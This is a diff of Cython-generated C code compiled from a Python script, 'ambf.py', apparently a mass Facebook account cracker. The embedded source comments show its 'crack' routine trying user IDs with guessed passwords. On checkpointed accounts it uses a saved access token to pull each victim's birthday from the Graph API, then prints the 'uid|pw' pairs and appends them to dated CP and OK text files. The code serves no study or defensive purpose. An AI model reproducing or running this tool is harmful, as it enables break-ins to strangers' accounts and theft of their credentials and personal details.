+                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
+                    if (likely(PyTuple_CheckExact(sequence))) {
+                      __pyx_t_8 = PyTuple_GET_ITEM(sequence, 0); 
+                      __pyx_t_11 = PyTuple_GET_ITEM(sequence, 1); 
+                      __pyx_t_12 = PyTuple_GET_ITEM(sequence, 2); 
+                    } else {
+                      __pyx_t_8 = PyList_GET_ITEM(sequence, 0); 
+                      __pyx_t_11 = PyList_GET_ITEM(sequence, 1); 
+                      __pyx_t_12 = PyList_GET_ITEM(sequence, 2); 
+                    }
+                    __Pyx_INCREF(__pyx_t_8);
+                    __Pyx_INCREF(__pyx_t_11);
+                    __Pyx_INCREF(__pyx_t_12);
+                    #else
+                    __pyx_t_8 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 507, __pyx_L43_error)
+                    __Pyx_GOTREF(__pyx_t_8);
+                    __pyx_t_11 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 507, __pyx_L43_error)
+                    __Pyx_GOTREF(__pyx_t_11);
+                    __pyx_t_12 = PySequence_ITEM(sequence, 2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 507, __pyx_L43_error)
+                    __Pyx_GOTREF(__pyx_t_12);
+                    #endif
+                    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  } else {
+                    Py_ssize_t index = -1;
+                    __pyx_t_6 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 507, __pyx_L43_error)
+                    __Pyx_GOTREF(__pyx_t_6);
+                    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                    __pyx_t_19 = Py_TYPE(__pyx_t_6)->tp_iternext;
+                    index = 0; __pyx_t_8 = __pyx_t_19(__pyx_t_6); if (unlikely(!__pyx_t_8)) goto __pyx_L51_unpacking_failed;
+                    __Pyx_GOTREF(__pyx_t_8);
+                    index = 1; __pyx_t_11 = __pyx_t_19(__pyx_t_6); if (unlikely(!__pyx_t_11)) goto __pyx_L51_unpacking_failed;
+                    __Pyx_GOTREF(__pyx_t_11);
+                    index = 2; __pyx_t_12 = __pyx_t_19(__pyx_t_6); if (unlikely(!__pyx_t_12)) goto __pyx_L51_unpacking_failed;
+                    __Pyx_GOTREF(__pyx_t_12);
+                    if (__Pyx_IternextUnpackEndCheck(__pyx_t_19(__pyx_t_6), 3) < 0) __PYX_ERR(0, 507, __pyx_L43_error)
+                    __pyx_t_19 = NULL;
+                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+                    goto __pyx_L52_unpacking_done;
+                    __pyx_L51_unpacking_failed:;
+                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
+                    __pyx_t_19 = NULL;
+                    if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
+                    __PYX_ERR(0, 507, __pyx_L43_error)
+                    __pyx_L52_unpacking_done:;
+                  }
+                  __pyx_v_month = __pyx_t_8;
+                  __pyx_t_8 = 0;
+                  __pyx_v_day = __pyx_t_11;
+                  __pyx_t_11 = 0;
+                  __pyx_v_year = __pyx_t_12;
+                  __pyx_t_12 = 0;
+
+                  /* "ambf.py":508
+ * 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+ * 					month, day, year = ttl.split("/")
+ * 					month = bulan_ttl[month]             # <<<<<<<<<<<<<<
+ * 					print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+ * 					cp.append("%s|%s"%(uid, pw))
+ */
+                  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_bulan_ttl); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 508, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __pyx_t_12 = __Pyx_PyObject_GetItem(__pyx_t_10, __pyx_v_month); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 508, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __Pyx_DECREF_SET(__pyx_v_month, __pyx_t_12);
+                  __pyx_t_12 = 0;
+
+                  /* "ambf.py":509
+ * 					month, day, year = ttl.split("/")
+ * 					month = bulan_ttl[month]
+ * 					print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))             # <<<<<<<<<<<<<<
+ * 					cp.append("%s|%s"%(uid, pw))
+ * 					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+ */
+                  __pyx_t_12 = PyTuple_New(5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 509, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_INCREF(__pyx_v_uid);
+                  __Pyx_GIVEREF(__pyx_v_uid);
+                  PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_uid);
+                  __Pyx_INCREF(__pyx_v_pw);
+                  __Pyx_GIVEREF(__pyx_v_pw);
+                  PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_pw);
+                  __Pyx_INCREF(__pyx_v_day);
+                  __Pyx_GIVEREF(__pyx_v_day);
+                  PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_v_day);
+                  __Pyx_INCREF(__pyx_v_month);
+                  __Pyx_GIVEREF(__pyx_v_month);
+                  PyTuple_SET_ITEM(__pyx_t_12, 3, __pyx_v_month);
+                  __Pyx_INCREF(__pyx_v_year);
+                  __Pyx_GIVEREF(__pyx_v_year);
+                  PyTuple_SET_ITEM(__pyx_t_12, 4, __pyx_v_year);
+                  __pyx_t_10 = __Pyx_PyString_Format(__pyx_kp_s_0_93m_s_s_s_s_s_0_97m, __pyx_t_12); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 509, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  if (__Pyx_PrintOne(0, __pyx_t_10) < 0) __PYX_ERR(0, 509, __pyx_L43_error)
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+
+                  /* "ambf.py":510
+ * 					month = bulan_ttl[month]
+ * 					print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+ * 					cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
+ * 					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+ * 					break
+ */
+                  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_cp); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 510, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __pyx_t_12 = PyTuple_New(2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 510, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_INCREF(__pyx_v_uid);
+                  __Pyx_GIVEREF(__pyx_v_uid);
+                  PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_uid);
+                  __Pyx_INCREF(__pyx_v_pw);
+                  __Pyx_GIVEREF(__pyx_v_pw);
+                  PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_pw);
+                  __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_12); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 510, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_11);
+                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_t_11); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 510, __pyx_L43_error)
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+
+                  /* "ambf.py":511
+ * 					print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
+ * 					cp.append("%s|%s"%(uid, pw))
+ * 					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))             # <<<<<<<<<<<<<<
+ * 					break
+ * 			except (KeyError, IOError):
+ */
+                  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __pyx_t_12 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_10); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_GIVEREF(__pyx_t_12);
+                  PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_12);
+                  __Pyx_INCREF(__pyx_n_s_a);
+                  __Pyx_GIVEREF(__pyx_n_s_a);
+                  PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_n_s_a);
+                  __pyx_t_12 = 0;
+                  __pyx_t_12 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_10, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  __pyx_t_12 = PyTuple_New(5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __Pyx_INCREF(__pyx_v_uid);
+                  __Pyx_GIVEREF(__pyx_v_uid);
+                  PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_v_uid);
+                  __Pyx_INCREF(__pyx_v_pw);
+                  __Pyx_GIVEREF(__pyx_v_pw);
+                  PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_v_pw);
+                  __Pyx_INCREF(__pyx_v_day);
+                  __Pyx_GIVEREF(__pyx_v_day);
+                  PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_v_day);
+                  __Pyx_INCREF(__pyx_v_month);
+                  __Pyx_GIVEREF(__pyx_v_month);
+                  PyTuple_SET_ITEM(__pyx_t_12, 3, __pyx_v_month);
+                  __Pyx_INCREF(__pyx_v_year);
+                  __Pyx_GIVEREF(__pyx_v_year);
+                  PyTuple_SET_ITEM(__pyx_t_12, 4, __pyx_v_year);
+                  __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_s_s_s, __pyx_t_12); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_8);
+                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  __pyx_t_12 = NULL;
+                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
+                    __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_10);
+                    if (likely(__pyx_t_12)) {
+                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
+                      __Pyx_INCREF(__pyx_t_12);
+                      __Pyx_INCREF(function);
+                      __Pyx_DECREF_SET(__pyx_t_10, function);
+                    }
+                  }
+                  __pyx_t_11 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_12, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8);
+                  __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
+                  if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 511, __pyx_L43_error)
+                  __Pyx_GOTREF(__pyx_t_11);
+                  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
+
+                  /* "ambf.py":512
+ * 					cp.append("%s|%s"%(uid, pw))
+ * 					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+ * 					break             # <<<<<<<<<<<<<<
+ * 			except (KeyError, IOError):
+ * 				day = (" ")
+ */
+                  goto __pyx_L48_try_break;
+
+                  /* "ambf.py":505
+ * 			try:
+ * 				token = open("login.txt", "r").read()
+ * 				with requests.Session() as ses:             # <<<<<<<<<<<<<<
+ * 					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+ * 					month, day, year = ttl.split("/")
+ */
+                }
+                __pyx_L43_error:;
+                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+                __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
+                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
+                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
+                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+                /*except:*/ {
+                  __Pyx_AddTraceback("ambf.crack", __pyx_clineno, __pyx_lineno, __pyx_filename);
+                  if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_10, &__pyx_t_8) < 0) __PYX_ERR(0, 505, __pyx_L45_except_error)
+                  __Pyx_GOTREF(__pyx_t_11);
+                  __Pyx_GOTREF(__pyx_t_10);
+                  __Pyx_GOTREF(__pyx_t_8);
+                  __pyx_t_12 = PyTuple_Pack(3, __pyx_t_11, __pyx_t_10, __pyx_t_8); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 505, __pyx_L45_except_error)
+                  __Pyx_GOTREF(__pyx_t_12);
+                  __pyx_t_25 = __Pyx_PyObject_Call(__pyx_t_21, __pyx_t_12, NULL);
+                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
+                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
+                  if (unlikely(!__pyx_t_25)) __PYX_ERR(0, 505, __pyx_L45_except_error)
+                  __Pyx_GOTREF(__pyx_t_25);
+                  __pyx_t_18 = __Pyx_PyObject_IsTrue(__pyx_t_25);
+                  __Pyx_DECREF(__pyx_t_25); __pyx_t_25 = 0;
+                  if (__pyx_t_18 < 0) __PYX_ERR(0, 505, __pyx_L45_except_error)
+                  __pyx_t_17 = ((!(__pyx_t_18 != 0)) != 0);
+                  if (__pyx_t_17) {
+                    __Pyx_GIVEREF(__pyx_t_11);
+                    __Pyx_GIVEREF(__pyx_t_10);
+                    __Pyx_XGIVEREF(__pyx_t_8);
+                    __Pyx_ErrRestoreWithState(__pyx_t_11, __pyx_t_10, __pyx_t_8);
+                    __pyx_t_11 = 0; __pyx_t_10 = 0; __pyx_t_8 = 0; 
+                    __PYX_ERR(0, 505, __pyx_L45_except_error)
+                  }
+                  __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+                  __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
+                  goto __pyx_L44_exception_handled;
+                }
+                __pyx_L45_except_error:;
+                __Pyx_XGIVEREF(__pyx_t_22);
+                __Pyx_XGIVEREF(__pyx_t_23);
+                __Pyx_XGIVEREF(__pyx_t_24);
+                __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_23, __pyx_t_24);
+                goto __pyx_L29_error;
+                __pyx_L48_try_break:;
+                __Pyx_XGIVEREF(__pyx_t_22);
+                __Pyx_XGIVEREF(__pyx_t_23);
+                __Pyx_XGIVEREF(__pyx_t_24);
+                __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_23, __pyx_t_24);
+                goto __pyx_L39_break;
+                __pyx_L44_exception_handled:;
+                __Pyx_XGIVEREF(__pyx_t_22);
+                __Pyx_XGIVEREF(__pyx_t_23);
+                __Pyx_XGIVEREF(__pyx_t_24);
+                __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_23, __pyx_t_24);
+              }
             }
-            __pyx_L37_except_error:;
-
-            /* "ambf.py":504
- * 				break
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():
- * 				try:             # <<<<<<<<<<<<<<
- * 					token = open("login.txt", "r").read()
- * 					with requests.Session() as ses:
- */
-            __Pyx_XGIVEREF(__pyx_t_19);
-            __Pyx_XGIVEREF(__pyx_t_18);
-            __Pyx_XGIVEREF(__pyx_t_17);
-            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_18, __pyx_t_17);
-            goto __pyx_L11_error;
-            __pyx_L40_try_break:;
-            __Pyx_XGIVEREF(__pyx_t_19);
-            __Pyx_XGIVEREF(__pyx_t_18);
-            __Pyx_XGIVEREF(__pyx_t_17);
-            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_18, __pyx_t_17);
-            goto __pyx_L18_break;
-            __pyx_L36_exception_handled:;
-            __Pyx_XGIVEREF(__pyx_t_19);
-            __Pyx_XGIVEREF(__pyx_t_18);
-            __Pyx_XGIVEREF(__pyx_t_17);
-            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_18, __pyx_t_17);
-            __pyx_L42_try_end:;
+            /*finally:*/ {
+              /*normal exit:*/{
+                if (__pyx_t_21) {
+                  __pyx_t_24 = __Pyx_PyObject_Call(__pyx_t_21, __pyx_tuple__40, NULL);
+                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
+                  if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 505, __pyx_L29_error)
+                  __Pyx_GOTREF(__pyx_t_24);
+                  __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
+                }
+                goto __pyx_L42;
+              }
+              __pyx_L39_break: {
+                if (__pyx_t_21) {
+                  __pyx_t_24 = __Pyx_PyObject_Call(__pyx_t_21, __pyx_tuple__40, NULL);
+                  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
+                  if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 505, __pyx_L29_error)
+                  __Pyx_GOTREF(__pyx_t_24);
+                  __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
+                }
+                goto __pyx_L34_try_break;
+              }
+              __pyx_L42:;
+            }
+            goto __pyx_L56;
+            __pyx_L37_error:;
+            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
+            goto __pyx_L29_error;
+            __pyx_L56:;
           }
-
-          /* "ambf.py":519
- * 					year = (" ")
- * 				except:pass
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))             # <<<<<<<<<<<<<<
- * 				cp.append("%s|%s"%(uid, pw))
- * 				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- */
-          __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 519, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pw);
-          __Pyx_GIVEREF(__pyx_v_pw);
-          PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_pw);
-          __pyx_t_10 = __Pyx_PyString_Format(__pyx_kp_s_0_93m_s_s_0_97m, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 519, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          if (__Pyx_PrintOne(0, __pyx_t_10) < 0) __PYX_ERR(0, 519, __pyx_L11_error)
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-
-          /* "ambf.py":520
- * 				except:pass
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
- * 				cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
- * 				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- * 				break
- */
-          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_cp); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 520, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 520, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pw);
-          __Pyx_GIVEREF(__pyx_v_pw);
-          PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_pw);
-          __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_11); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 520, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          __pyx_t_23 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_t_8); if (unlikely(__pyx_t_23 == ((int)-1))) __PYX_ERR(0, 520, __pyx_L11_error)
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-
-          /* "ambf.py":521
- * 				print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
- * 				cp.append("%s|%s"%(uid, pw))
- * 				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
- * 				break
- * 			else:
- */
-          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_tanggal); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __pyx_t_11 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_10 = PyTuple_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_GIVEREF(__pyx_t_11);
-          PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_11);
-          __Pyx_INCREF(__pyx_n_s_a);
-          __Pyx_GIVEREF(__pyx_n_s_a);
-          PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_n_s_a);
-          __pyx_t_11 = 0;
-          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_10, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_10);
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_11);
-          __Pyx_INCREF(__pyx_v_uid);
-          __Pyx_GIVEREF(__pyx_v_uid);
-          PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_v_uid);
-          __Pyx_INCREF(__pyx_v_pw);
-          __Pyx_GIVEREF(__pyx_v_pw);
-          PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_v_pw);
-          __pyx_t_12 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_12);
-          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
-          __pyx_t_11 = NULL;
-          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
-            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_10);
-            if (likely(__pyx_t_11)) {
-              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
-              __Pyx_INCREF(__pyx_t_11);
-              __Pyx_INCREF(function);
-              __Pyx_DECREF_SET(__pyx_t_10, function);
-            }
-          }
-          __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_11, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12);
-          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
-          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
-          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 521, __pyx_L11_error)
-          __Pyx_GOTREF(__pyx_t_8);
-          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-
-          /* "ambf.py":522
- * 				cp.append("%s|%s"%(uid, pw))
- * 				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- * 				break             # <<<<<<<<<<<<<<
- * 			else:
- * 				continue
- */
-          goto __pyx_L18_break;
 
           /* "ambf.py":503
- * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
- * 				break
- * 			elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
- * 				try:
- * 					token = open("login.txt", "r").read()
+ * 			break
+ * 		elif "checkpoint" in ses.cookies.get_dict().keys():
+ * 			try:             # <<<<<<<<<<<<<<
+ * 				token = open("login.txt", "r").read()
+ * 				with requests.Session() as ses:
  */
         }
+        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
+        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
+        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
+        goto __pyx_L36_try_end;
+        __pyx_L29_error:;
+        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
+        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
+        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
+        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
+        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
+        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
+        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
 
-        /* "ambf.py":524
- * 				break
- * 			else:
- * 				continue             # <<<<<<<<<<<<<<
- * 
- * 		loop+=1
+        /* "ambf.py":513
+ * 					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+ * 					break
+ * 			except (KeyError, IOError):             # <<<<<<<<<<<<<<
+ * 				day = (" ")
+ * 				month = (" ")
  */
-        /*else*/ {
-          goto __pyx_L17_continue;
+        __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
+        if (__pyx_t_7) {
+          __Pyx_AddTraceback("ambf.crack", __pyx_clineno, __pyx_lineno, __pyx_filename);
+          if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_10, &__pyx_t_11) < 0) __PYX_ERR(0, 513, __pyx_L31_except_error)
+          __Pyx_GOTREF(__pyx_t_8);
+          __Pyx_GOTREF(__pyx_t_10);
+          __Pyx_GOTREF(__pyx_t_11);
+
+          /* "ambf.py":514
+ * 					break
+ * 			except (KeyError, IOError):
+ * 				day = (" ")             # <<<<<<<<<<<<<<
+ * 				month = (" ")
+ * 				year = (" ")
+ */
+          __Pyx_INCREF(__pyx_kp_s__8);
+          __Pyx_XDECREF_SET(__pyx_v_day, __pyx_kp_s__8);
+
+          /* "ambf.py":515
+ * 			except (KeyError, IOError):
+ * 				day = (" ")
+ * 				month = (" ")             # <<<<<<<<<<<<<<
+ * 				year = (" ")
+ * 			except:pass
+ */
+          __Pyx_INCREF(__pyx_kp_s__8);
+          __Pyx_XDECREF_SET(__pyx_v_month, __pyx_kp_s__8);
+
+          /* "ambf.py":516
+ * 				day = (" ")
+ * 				month = (" ")
+ * 				year = (" ")             # <<<<<<<<<<<<<<
+ * 			except:pass
+ * 			print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
+ */
